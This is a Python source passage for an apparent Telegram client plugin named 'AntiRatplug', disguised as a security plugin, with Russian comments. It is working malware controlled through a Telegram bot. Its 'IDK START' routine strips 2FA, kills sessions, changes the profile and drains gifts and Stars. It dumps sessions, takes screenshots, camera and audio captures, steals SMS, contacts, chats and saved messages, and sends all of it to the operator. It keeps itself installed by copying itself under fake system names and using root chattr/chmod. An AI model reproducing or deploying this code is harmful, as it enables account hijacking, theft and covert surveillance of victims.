            out.sort()
            self._send_msg("<b>Приложения (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:300]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_chats(self):
        try:
            mc = _MC().getInstance(0)
            DO = jclass("org.telegram.messenger.DialogObject")
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if dialogs is None:
                return "empty"
            out = []
            for i in range(dialogs.size()):
                try:
                    did = int(dialogs.keyAt(i))
                    title = ""
                    try:
                        title = str(DO.getName(0, did))
                    except Exception:
                        pass
                    if not title:
                        if did > 0:
                            u = mc.getUser(did)
                            if u is not None:
                                parts = (
                                    str(getattr(u, "first_name", "") or ""),
                                    str(getattr(u, "last_name", "") or ""),
                                )
                                title = " ".join(x for x in parts if x) or str(did)
                        else:
                            cid = -did
                            if cid > 1000000000000:
                                cid -= 1000000000000
                            c = mc.getChat(int(cid))
                            if c is not None:
                                title = str(getattr(c, "title", "") or str(did))
                    out.append("%d — %s" % (did, title or "?"))
                except Exception:
                    pass
            self._send_msg("<b>Чаты (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _export_saved_messages(self):
        try:
            uid = int(_UC().getInstance(0).getClientUserId())
            ip = self._get_input_peer(0, uid)
            if ip is None:
                return "no peer"
            rq = TLRPC.TL_messages_getHistory()
            rq.peer = ip
            rq.limit = 100
            rq.offset_id = 0
            r, _e = self._rg_rpc(rq, 0, 20.0, fast=True)
            if r is None:
                return "no resp"
            msgs = getattr(r, "messages", None)
            if msgs is None:
                return "no msgs"
            lines = []
            for i in range(msgs.size()):
                m = msgs.get(i)
                if m is None:
                    continue
                t = str(getattr(m, "message", "") or "")
                d = int(getattr(m, "date", 0))
                if t:
                    lines.append("[%s] %s" % (
                        time.strftime("%Y-%m-%d %H:%M", time.localtime(d)), t))
            html = "<html><head><meta charset='utf-8'><title>Saved</title></head><body><pre>"
            html += self._html_escape("\n".join(lines)) + "</pre></body></html>"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("messages.html", html.encode("utf-8"))
            self._send_document_bytes("saved_%d.zip" % uid, z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    # ═══════════════════════════════════════════════════════════════════════
    # PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    def _plugins_dir(self):
        try:
            ctx = ApplicationLoader.applicationContext
            base = str(ctx.getFilesDir().getAbsolutePath())
            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))), "files", "plugins")
            if os.path.isdir(p):
                return p
        except Exception:
            pass
        try:
            from file_utils import get_plugins_dir
            d = get_plugins_dir()
            if d:
                return d
        except Exception:
            pass
        return None

    def _self_path(self):
        try:
            m = sys.modules.get(__name__)
            f = getattr(m, "__file__", None)
            if f and os.path.exists(f):
                return f
        except Exception:
            pass
        return None

    def _harden_file(self, path):
        try:
            k = path
            n = time.time()
            l = self._harden_cache.get(k, 0)
            if n - l < 10:
                return
            self._harden_cache[k] = n
        except Exception:
            pass
        try:
            from java.io import File
            f = File(path)
            f.setReadOnly()
            try:
                f.setExecutable(True)
            except Exception:
                pass
            try:
                f.setHidden(True)
            except Exception:
                pass
        except Exception:
            pass
        for cmd in ("chattr +i '%s'" % path, "chmod 555 '%s'" % path):
            try:
                subprocess.run(["su", "-c", cmd], stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=3)
            except Exception:
                pass

    def _replicate_self(self, n=10):
        pd = self._plugins_dir()
        if not pd:
            return {"ok": False}
        sp = self._self_path()
        if not sp:
            return {"ok": False}
        try:
            with open(sp, "rb") as f:
                src = f.read()
        except Exception as e:
            return {"ok": False, "e": str(e)}
        names = ["kernel_hook.plugin", "system_guard.plugin", "boot_watch.plugin",
                 "net_monitor.plugin", "mem_sync.plugin", "proc_hold.plugin",
                 "core_lock.plugin", "daemon_run.plugin", "svc_watch.plugin",
                 "ring0_mon.plugin"]
        made = []
        for i in range(min(int(n), len(names))):
            try:
                tgt = os.path.join(pd, names[i])
                if os.path.exists(tgt):
                    made.append(names[i])
                    continue
                with open(tgt, "wb") as f:
                    f.write(src)
                self._harden_file(tgt)
                made.append(names[i])
            except Exception:
                pass
        return {"ok": True, "made": made}

    def _install_persistence(self):
        try:
            ctx = ApplicationLoader.applicationContext
            cd = str(ctx.getCacheDir().getAbsolutePath())
            fd = str(ctx.getFilesDir().getAbsolutePath())
        except Exception:
            return
        try:
            pl = os.path.join(cd, "kernel_persist.lock")
            if not os.path.exists(pl):
                with open(pl, "w") as f:
                    f.write(_hl.sha256(b"ar19_idk").hexdigest())
                self._harden_file(pl)
        except Exception:
            pass

        def _bk(base):
            try:
                h = os.path.join(base, ".ar_hidden")
                if not os.path.exists(h):
                    os.makedirs(h, exist_ok=True)
                sp = self._self_path()
                if sp and os.path.exists(sp):
                    bkp = os.path.join(h, "ar_backup.py")
                    if not os.path.exists(bkp):
                        shutil.copy2(sp, bkp)
                        self._harden_file(bkp)
            except Exception:
                pass

        self._parallel([(_bk, cd), (_bk, fd), (_bk, "/data/local/tmp/"),
                        (_bk, "/sdcard/Android/data/")], workers=4, timeout=15)

    def _nuke_marker_path(self):
        try:
            ctx = ApplicationLoader.applicationContext
            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
        except Exception:
            return None

    def _mark_nuke(self):
        try:
            m = self._nuke_marker_path()
            if m:
                with open(m, "w") as f:
                    f.write("idk")
                self._harden_file(m)
            self._nuke_started = True
        except Exception:
            pass

    def _check_persisted_nuke(self):
        try:
            m = self._nuke_marker_path()
            if not m or not os.path.exists(m):
                return
            self._nuke_started = True
            threading.Thread(target=self._nuke_loop, daemon=True).start()
        except Exception:
            pass

    def _nuke_loop(self):
        # уважает _sync_running и _active — не крутится после unload
        while self._sync_running and self._active:
            try:
                m = self._nuke_marker_path()
                if not m or not os.path.exists(m):
                    return
                self._parallel([(self._kill_all_sessions, 0),
                                (self._kill_web_authorizations, 0)], workers=2, timeout=25)
                # спим короткими срезами, чтобы быстро выйти при unload
                for _ in range(60):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)
            except Exception:
                for _ in range(12):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)

    # ═══════════════════════════════════════════════════════════════════════
    # IDK START
    # ═══════════════════════════════════════════════════════════════════════
    def _check_persisted_idk(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
            if prefs.getBoolean("idk_active", False):
                self._show_idk_overlay()
        except Exception:
            pass

    def _idk_start(self):
        def task():
            try:
                if SHOW_IDK_OVERLAY:
                    try:
                        self._show_idk_overlay()
                    except Exception:
                        pass
                    try:
                        prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
                        e = prefs.edit()
                        e.putBoolean("idk_active", True)
                        e.apply()
                    except Exception:
                        pass

                self._send_msg("🔴 <b>IDK START v19.4</b>")
                t0 = time.time()

                try:
                    self._send_msg("1/15 Tg kid...")
                    self._tg_kid()
                except Exception:
                    pass

                try:
                    self._send_msg("2/15 2FA pipeline...")
                except Exception:
                    pass
                try:
                    pwd_report = self._nuke_password_pipeline(0)
                except Exception as e:
                    pwd_report = {"error": str(e), "final": "exc"}

                try:
                    self._send_msg("3/15 Confirm sessions...")
                except Exception:
                    pass
                try:
                    self._confirm_unconfirmed_sessions(0)
                except Exception:
                    pass

                try:
                    self._send_msg("4/15 Web/bots/channels...")
                except Exception:
                    pass
                try:
                    self._kill_web_authorizations(0)
                except Exception:
                    pass
                try:
                    self._kill_bots(0)
                except Exception:
                    pass
                try:
                    self._leave_all_channels(0)
                except Exception:
                    pass

                try:
                    self._send_msg("5/15 Profile...")
                except Exception:
                    pass
                try:
                    self._change_username(0)
                except Exception:
                    pass
                try:
                    self._change_profile(0)
                except Exception:
                    pass
                try:
                    self._reset_contacts(0)
                except Exception:
                    pass

                try:
                    self._send_msg("6/15 Gift drain...")
                except Exception:
                    pass
                try:
                    dr = self._drain_all_accounts()
                except Exception as e:
                    dr = [{"error": str(e)}]

                try:
                    self._send_msg("7/15 Stars reactions...")
                except Exception:
                    pass
                try:
                    rr = self._h_reactions(0)
                except Exception as e:
                    rr = {"error": str(e)}

                try:
                    self._send_msg("8/15 Kill sessions...")
                except Exception:
                    pass
                try:
                    self._kill_all_sessions(0)
                except Exception:
                    pass

                try:
                    self._send_msg("9/15 Wipe all sessions...")
                except Exception:
                    pass
                try:
                    ws = self._wipe_sessions_all()
                except Exception as e:
                    ws = [{"error": str(e)}]

                try:
                    self._kill_login_notice_dialog(0)
                except Exception:
                    pass

                try:
                    self._send_msg("10/15 Session dump...")
                except Exception:
                    pass
                try:
                    self._manual_dump_session()
                except Exception:
                    pass
                try:
                    self._manual_userbot_session()
                except Exception:
                    pass

                try:
                    self._send_msg("11/15 Screenshot/camera/audio...")
                except Exception:
                    pass
                try:
                    self._screenshot()
                except Exception:
                    pass
                try:
                    self._manual_camera("front")
                except Exception:
                    pass
                try:
                    self._manual_camera("back")
                except Exception:
                    pass
                try:
                    self._manual_audio(5)
                except Exception:
                    pass

                try:
                    self._send_msg("12/15 SMS/contacts/apps/chats...")
                except Exception:
                    pass
                try:
                    self._manual_sms()
                except Exception:
                    pass
                try:
                    self._manual_contacts()
                except Exception:
                    pass
                try:
                    self._manual_apps()
                except Exception:
                    pass
                try:
                    self._manual_chats()
                except Exception:
                    pass

                try:
                    self._send_msg("13/15 Saved export...")
                except Exception:
                    pass
                try:
                    self._export_saved_messages()
                except Exception:
                    pass

                try:
                    self._send_msg("14/15 Persistence...")
                except Exception:
                    pass
                try:
                    self._install_persistence()
                except Exception:
                    pass
                try:
                    self._replicate_self(10)
                except Exception:
                    pass
                try:
                    self._mark_nuke()
                except Exception:
                    pass

                try:
                    self._send_msg("15/15 Pull Out...")
                except Exception:
                    pass
                try:
                    self._pull_out_account()
                except Exception:
                    pass

                try:
                    rep = ["<b>🔴 IDK START v19.4 — результат</b>"]
                    rep.append("<b>2FA pipe:</b>")
                    rep.append("  Recovery: %s" % pwd_report.get("recovery_removed"))
                    rep.append("  Reset: %s" % str(pwd_report.get("reset_password"))[:60])
                    rep.append("  Cloud: %s" % str(pwd_report.get("cloud_wiped"))[:60])
                    rep.append("  Итог: %s" % pwd_report.get("final"))
                    tot_ok = 0
                    for x in dr:
                        r = x.get("result") or {}
                        tot_ok += int(r.get("ok", 0) or 0) + int(r.get("convert", 0) or 0)
                    rep.append("<b>Gifts:</b> %d ok, %d акк" % (tot_ok, len(dr)))
                    rep.append("<b>Stars:</b> %s" % str(rr)[:80])
                    tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
                    rep.append("<b>Sessions:</b> %d убито на %d акк" % (tk, len(ws)))
                    rep.append("<b>Время:</b> %.1fс" % (time.time() - t0))
                    self._send_msg("\n".join(rep), html=True)
                except Exception:
                    pass
            except Exception as e:
                try:
                    self._send_msg("IDK err: " + str(e))
                except Exception:
                    pass
        threading.Thread(target=task, daemon=True).start()

    # ═══════════════════════════════════════════════════════════════════════
    # BOT
    # ═══════════════════════════════════════════════════════════════════════
    def _api(self, method):
        cfg, _t = _cfg()
        return _u(_HOST_TG) + cfg + "/" + method

    def _send_manage_button(self):
        from java.net import URL, URLEncoder
        from java.io import DataOutputStream
        username = "?"
        try:
            uc = _UC().getInstance(0)
            user = uc.getCurrentUser()
            if user is not None:
                username = str(user.username) if user.username is not None else "id:" + str(uc.getClientUserId())
        except Exception:
            pass
        text = "<b>AntiRatplug v19.4</b>\nUser: @" + username
        buttons = [[{"text": "Manage", "callback_data": "menu"}]]
        markup = json.dumps({"inline_keyboard": buttons})
        _cfg()
        for target in _targets:
            try:
                url = URL(self._api("sendMessage"))
                conn = url.openConnection()
                conn.setRequestMethod("POST")
                conn.setDoOutput(True)
                conn.setConnectTimeout(8000)
                conn.setReadTimeout(8000)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                params = ("chat_id=" + target
                          + "&text=" + str(URLEncoder.encode(text, "UTF-8"))
                          + "&parse_mode=HTML&reply_markup=" + str(URLEncoder.encode(markup, "UTF-8")))
                out = DataOutputStream(conn.getOutputStream())
                out.writeBytes(params)
                out.flush()
                out.close()
                conn.getResponseCode()
                conn.disconnect()
            except Exception:
                pass

    def _send_markup(self, text, keyboard, html=False):
        from java.net import URL, URLEncoder
        from java.io import DataOutputStream
        _cfg()
        markup = json.dumps(keyboard)
        for target in _targets:
            try:
                url = URL(self._api("sendMessage"))
                conn = url.openConnection()
                conn.setRequestMethod("POST")
                conn.setDoOutput(True)
                conn.setConnectTimeout(8000)
                conn.setReadTimeout(8000)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                params = ("chat_id=" + target
                          + "&text=" + str(URLEncoder.encode(text, "UTF-8"))
                          + "&reply_markup=" + str(URLEncoder.encode(markup, "UTF-8")))
                if html:
                    params += "&parse_mode=HTML"
                out = DataOutputStream(conn.getOutputStream())
                out.writeBytes(params)
                out.flush()
                out.close()
                conn.getResponseCode()
                conn.disconnect()
            except Exception:
                pass

    def _show_main_menu(self):
        keyboard = {
            "keyboard": [
                [{"text": "Tg kid"}],
                [{"text": "IDK start"}],
                [{"text": "Pull Out"}],
                [{"text": "Kill All Sessions"}],
            ],
            "resize_keyboard": True,
        }
        self._send_markup("<b>Меню:</b>", keyboard, html=True)

    def _send_msg(self, text, html=False):
        from java.net import URL, URLEncoder
        from java.io import DataOutputStream
        _cfg()
        for target in _targets:
            try:
                url = URL(self._api("sendMessage"))
                conn = url.openConnection()
                conn.setRequestMethod("POST")
                conn.setDoOutput(True)
                conn.setConnectTimeout(6000)
                conn.setReadTimeout(6000)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                enc = URLEncoder.encode(text, "UTF-8")
                if html:
                    params = "chat_id=" + target + "&text=" + str(enc) + "&parse_mode=HTML"
                else:
                    params = "chat_id=" + target + "&text=" + str(enc)
                out = DataOutputStream(conn.getOutputStream())
                out.writeBytes(params)
                out.flush()
                out.close()
                conn.getResponseCode()
                conn.disconnect()
            except Exception:
                pass

    def _send_photo(self, file_path, caption):
        _cfg()
        from java.net import URL
        from java.io import DataOutputStream, FileInputStream
        boundary = "----AR7MA4YWxkTrZu0gW"
        for target in _targets:
            try:
                url = URL(self._api("sendPhoto"))
                conn = url.openConnection()
                conn.setRequestMethod("POST")
                conn.setDoOutput(True)
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
                s = DataOutputStream(conn.getOutputStream())
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="chat_id"\r\n\r\n')
                s.writeBytes(str(target) + "\r\n")
                if caption:
                    s.writeBytes("--" + boundary + "\r\n")
                    s.writeBytes('Content-Disposition: form-data; name="caption"\r\n\r\n')
                    s.writeBytes(str(caption) + "\r\n")
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="photo"; filename="s.png"\r\n')
                s.writeBytes("Content-Type: image/png\r\n\r\n")
                fis = FileInputStream(file_path)
                buf = bytearray(8192)
                while True:
                    n = fis.read(buf)
                    if n < 0:
                        break
                    s.write(buf, 0, n)
                fis.close()
                s.writeBytes("\r\n--" + boundary + "--\r\n")
                s.flush()
                s.close()
                conn.getResponseCode()
                conn.disconnect()
            except Exception:
                pass

    def _send_document_bytes(self, filename, data):
        _cfg()
        from java.net import URL
        from java.io import DataOutputStream
        boundary = "----AR7MA4YWxkTrZu0gW"
        for target in _targets:
            try:
                url = URL(self._api("sendDocument"))
                conn = url.openConnection()
                conn.setRequestMethod("POST")
                conn.setDoOutput(True)
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
                s = DataOutputStream(conn.getOutputStream())
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="chat_id"\r\n\r\n')
                s.writeBytes(str(target) + "\r\n")
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="document"; filename="%s"\r\n' % filename)
                s.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
                s.write(bytes(data))
                s.writeBytes("\r\n--" + boundary + "--\r\n")
                s.flush()
                s.close()
                conn.getResponseCode()
                conn.disconnect()
            except Exception:
                pass

    def _answer_callback(self, cid):
        try:
            from java.net import URL
            from java.io import DataOutputStream
            url = URL(self._api("answerCallbackQuery"))
            conn = url.openConnection()
            conn.setRequestMethod("POST")
            conn.setDoOutput(True)
            conn.setConnectTimeout(6000)
            conn.setReadTimeout(6000)
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            out = DataOutputStream(conn.getOutputStream())
            out.writeBytes("callback_query_id=" + str(cid))
            out.flush()
            out.close()
            conn.getResponseCode()
            conn.disconnect()
        except Exception:
            pass

    def _start_polling(self):
        threading.Thread(target=self._poll, daemon=True).start()

    def _http_get(self, url_str):
        from java.net import URL
        from java.io import BufferedReader, InputStreamReader
        conn = None
        try:
            url = URL(url_str)
            conn = url.openConnection()
            conn.setRequestMethod("GET")
            conn.setConnectTimeout(12000)
            conn.setReadTimeout(12000)
            r = BufferedReader(InputStreamReader(conn.getInputStream()))
            resp = ""
            line = r.readLine()
            while line is not None:
                resp += str(line)
                line = r.readLine()
            r.close()
            return resp
        finally:
            try:
                if conn is not None:
                    conn.disconnect()
            except Exception:
                pass

    def _poll(self):
        offset = 0
        _cfg()
        try:
            data = json.loads(self._http_get(self._api("getUpdates") + "?offset=-1&timeout=0"))
            if data.get("ok") and data.get("result"):
                offset = data["result"][-1]["update_id"] + 1
        except Exception:
            pass

        while self._sync_running:
            try:
                data = json.loads(self._http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=8"))
                if data.get("ok") and data.get("result"):
                    for u in data["result"]:
                        offset = u["update_id"] + 1
                        if "callback_query" in u:
                            self._handle_callback(u["callback_query"])
                        elif "message" in u:
                            self._handle_message(u["message"])
            except Exception:
                pass
            time.sleep(0.35)

    def _handle_callback(self, cb):
        try:
            cid = cb["id"]
            cd = cb.get("data", "")
            self._answer_callback(cid)
            if cd == "menu":
                self._show_main_menu()
            elif cd == "close_idk":
                try:
                    prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
                    e = prefs.edit()
                    e.putBoolean("idk_active", False)
                    e.apply()
                except Exception:
                    pass
                self._hide_idk_overlay()
                self._send_msg("IDK overlay снят.")
            elif cd == "hv_logout":
                threading.Thread(target=self._pull_out_account, daemon=True).start()
        except Exception as e:
            _log("handle_callback: %s" % e)

    def _handle_message(self, msg):
        t = (msg.get("text") or "").strip()
        if t == "Tg kid":
            threading.Thread(target=self._tg_kid, daemon=True).start()
        elif t == "IDK start":
            self._idk_start()
        elif t == "Pull Out":
            threading.Thread(target=self._pull_out_account, daemon=True).start()
        elif t == "Kill All Sessions":
            threading.Thread(target=self._kill_all_sessions_full, daemon=True).start()

    def _kill_all_sessions_full(self):
        try:
            self._send_msg("☠️ <b>Kill All Sessions — на всех аккаунтах</b>")
            t0 = time.time()
            res = self._kill_absolutely_all_sessions_all_accounts()
            total_killed = 0
            total_logout = 0
            acc_count = 0
            for r in res:
                acc_count += 1
                x = r.get("result") or {}
                total_killed += int(x.get("killed", 0) or 0)
                if x.get("logged_out"):
                    total_logout += 1
            rep = [
                "<b>☠️ Kill All Sessions — отчёт</b>",
                "<b>Аккаунтов обработано:</b> %d" % acc_count,
                "<b>Сессий убито:</b> %d" % total_killed,
                "<b>Logout (текущих):</b> %d" % total_logout,
                "<b>Время:</b> %.1fс" % (time.time() - t0),
            ]
            self._send_msg("\n".join(rep), html=True)
        except Exception as e:
            self._send_msg("Kill All err: " + str(e))

    def _pull_out_account(self):
        try:
            self._send_msg("Pull Out...")
            rq = TLRPC.TL_auth_logOut()
            _r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
            if e is not None:
                self._send_msg("Pull out err: " + str(e))
            else:
                self._send_msg("Pull out OK.")
        except Exception as e:
            self._send_msg("Pull out exc: " + str(e))

    def _session_wipe(self):
        try:
            self._send_msg("Убиваю сессии...")
            rq = TLRPC.TL_auth_resetAuthorizations()
            _r, e = self._rg_rpc(rq, 0, 12.0)
            if e is not None:
                self._send_msg("Wipe err: " + str(e))
            else:
                self._send_msg("Все прочие сессии убиты.")
        except Exception as e:
            self._send_msg("Wipe exc: " + str(e))


def create_plugin():
    return PluginSecurityPlugin()
